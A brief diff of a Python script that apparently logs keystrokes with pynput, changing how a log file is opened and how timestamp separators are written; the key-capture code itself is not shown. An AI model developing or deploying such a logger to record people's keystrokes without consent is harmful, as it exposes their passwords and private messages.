@@ -6,14 +6,13 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime
 
 #opening log file in append mode
-fp = open('log.txt', 'a')
+fp = open('log.txt', '+a')
 
 #current date and time
 log_time = datetime.now()
 
 #starting every log neatly
-for _ in range(3):
-    fp.write('\n')
+fp.write('\n\n\n')
 fp.write('------------------------------ Timestamp:' + str(log_time) + '------------------------------')
 fp.write('\n\n')
 
